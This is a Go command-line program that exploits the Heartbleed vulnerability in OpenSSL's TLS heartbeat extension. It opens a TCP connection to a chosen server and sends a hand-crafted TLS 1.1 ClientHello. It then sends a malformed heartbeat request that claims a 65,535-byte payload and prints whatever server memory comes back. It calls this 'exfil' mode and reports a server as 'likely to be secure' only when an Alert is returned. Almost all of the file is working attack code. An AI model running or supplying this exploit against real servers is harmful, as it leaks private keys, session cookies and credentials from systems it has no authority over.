package main

import (
	"fmt"
	"io"
	"net"
	"os"

	"github.com/mkideal/cli"
	"github.com/pterm/pterm"
)

type argT struct {
	cli.Helper
	Mode   string `cli:"*mode" usage:"scan or exfil"`
	Server string `cli:"*server" usage:"IPv4 string"`
	Port   int    `cli:"*port" usage:"0 to 65535"`
	Bytes  int    `cli:"bytes" usage:"only required for exfil mode, default to 100" dft:"100"`
}

func (argv *argT) Validate(ctx *cli.Context) error {
	if argv.Mode != "scan" && argv.Mode != "exfil" {
		return fmt.Errorf("mode %s is invalid", argv.Mode)
	}
	if argv.Port < 0 || argv.Port > 65535 {
		return fmt.Errorf("port %d out of range", argv.Port)
	}
	if net.ParseIP(argv.Server) == nil {
		return fmt.Errorf("%s is not a valid ip address", argv.Server)
	}
	return nil
}

func main() {
	os.Exit(cli.Run(new(argT), func(ctx *cli.Context) error {
		argv := ctx.Argv().(*argT)
		pterm.Info.Printf("Starting exploit with %s mode at %s:%d\n", argv.Mode, argv.Server, argv.Port)
		pterm.Info.Printf("Initializing TLS client . . .\n")
		server := fmt.Sprintf("%s:%d", argv.Server, argv.Port)
		conn, err := net.Dial("tcp", server)
		defer conn.Close()
		if err != nil {
			pterm.Error.Printf("Unable to connect to server at %s, err : %s\n", server, err.Error())
			return nil
		}

		clientHelloMsg := []byte{
			0x16, 0x03, 0x02, 0x00, 0x36, // Content type = 16 (handshake message); Version = 03 02; Packet length = 00 36
			0x01, 0x00, 0x00, 0x32, // Message type = 01 (client hello); Length = 00 00 32
			0x03, 0x02, // Client version = 03 02 (TLS 1.1)
			0x50, 0x0b, 0xaf, 0xbb, 0xb7, 0x5a, 0xb8, 0x3e, 0xf0, 0xab, 0x9a, 0xe3, 0xf3, 0x9c, 0x63, 0x15,
			0x33, 0x41, 0x37, 0xac, 0xfd, 0x6c, 0x18, 0x1a, 0x24, 0x60, 0xdc, 0x49, 0x67, 0xc2, 0xfd, 0x96, // Random (uint32 time followed by 28 random bytes)
			0x00,       // Session id = 00
			0x00, 0x04, // Cipher suite length
			0x00, 0x33, 0xc0, 0x11, // 4 cipher suites
			0x01,       // Compression methods length
			0x00,       // Compression method 0: no compression = 0
			0x00, 0x05, // Extensions length = 5
			0x00, 0x0f, 0x00, 0x01, 0x01, // Enable Heartbeat extension
		}

		heartbleedPacket := []byte{
			0x18, 0x03, 0x02, 0x00, 0x29, // Content type = 18 (heartbeat message); Version = 03 02; Packet length = 00 03
			0x01, 0xff, 0xff, // Heartbeat message type = 01 (request); Payload length = FF FF
			0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
			0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41,
			0x41, 0x41, 0x41, 0x41, 0x41, 0x42, 0x43, 0x44,
			0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C,
			0x4D, 0x4E, 0x4F, 0x41, 0x42, 0x43, 0x44, 0x45,
			0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D,
			0x4E, 0x4F, 0x41, 0x42, 0x43, 0x44,
			0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C,
			0x4D, 0x4E, 0x4F, 0x41, 0x42, 0x43, 0x44, 0x45,
			0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D,
			0x4E, 0x4F, 0x41, 0x42, 0x43, 0x44,
			0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C,
			0x4D, 0x4E, 0x4F, 0x41, 0x42, 0x43, 0x44, 0x45,
			0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D,
			0x4E, 0x4F, 0x41, 0x42, 0x43, 0x44,
			0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C,
			0x4D, 0x4E, 0x4F, 0x41, 0x42, 0x43, 0x44, 0x45,
			0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D,
			0x4E, 0x4F, 0x41, 0x42, 0x43, 0x44,
			0x45, 0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C,
			0x4D, 0x4E, 0x4F, 0x41, 0x42, 0x43, 0x44, 0x45,
			0x46, 0x47, 0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D,
			0x4E, 0x4F,
		}

		pterm.Info.Printf("Sending Client Hello . . .\n")
		_, err = conn.Write(clientHelloMsg)
		if err != nil {
			pterm.Error.Printf("Unable to send client hello message, err : %s\n", err.Error())
			return nil
		}
		for i := 0; i < 4; i++ { // Expect to receive 4 TLS handshake packet (Hello, Certificate, Server Key Exchange, Hello Done)
			recvTLSHeaderBuf := make([]byte, 5) // We are expecting to receive 5 bytes of header

			_, err = io.ReadFull(conn, recvTLSHeaderBuf)
			if err != nil {
				pterm.Error.Println("read error:", err)
			}
			contentType := recvTLSHeaderBuf[0]
			if contentType != 0x16 {
				pterm.Error.Printf("Wrong content type received for Server Hello, expecting 22 got %v\n", contentType)
			}
			tlsVersion, _ := convertToInt(recvTLSHeaderBuf[1:3])
			if tlsVersion != 770 {
				pterm.Error.Printf("Wrong version received for Server Hello, expecting 770 (TLS 1.1) got %v\n", contentType)
			}
			length, _ := convertToInt(recvTLSHeaderBuf[3:])
			pterm.Info.Printf("Received message : type = %v, ver = %v, length = %v\n", contentType, tlsVersion, length)

			recvPayloadBuf := make([]byte, length) // Receive the data that the server told us it'd send
			_, err = io.ReadFull(conn, recvPayloadBuf)
			if err != nil {
				pterm.Error.Println("read error:", err)
			}
		}
		pterm.Info.Printf("Successfully received all packets for Server Hello\n")

		pterm.Info.Printf("Sending heartbeat message . . .\n")
		_, err = conn.Write(heartbleedPacket)
		if err != nil {
			pterm.Error.Printf("Unable to send heartbeat, err : %s\n", err.Error())
			return nil
		}
		recvHeartbeatRespHeaderBuf := make([]byte, 5)
		_, err = io.ReadFull(conn, recvHeartbeatRespHeaderBuf)
		if err != nil {
			pterm.Error.Println("read error:", err)
		}
		contentType := recvHeartbeatRespHeaderBuf[0]
		tlsVersion, _ := convertToInt(recvHeartbeatRespHeaderBuf[1:3])
		if tlsVersion != 770 {
			pterm.Warning.Printf("Wrong version received for Server Hello, expecting 770 (TLS 1.1) got %v\n", contentType)
		}
		length, _ := convertToInt(recvHeartbeatRespHeaderBuf[3:])
		pterm.Info.Printf("Received message : type = %v, ver = %v, length = %v\n", contentType, tlsVersion, length)
		if contentType == 0x15 {
			pterm.Success.Prefix = pterm.Prefix{
				Text:  "INFO",
				Style: pterm.NewStyle(pterm.BgGreen),
			}
			pterm.Success.Printf("got %v (Alert) as content type, this server is likely to be secure\n", contentType)
			return nil
		}

		recvHeartbeatRespPayloadBuf := make([]byte, length)
		_, err = io.ReadFull(conn, recvHeartbeatRespPayloadBuf)
		if err != nil {
			pterm.Error.Println("read error:", err)
		}
		fmt.Println(string(recvHeartbeatRespPayloadBuf))

		return nil
	}))
}
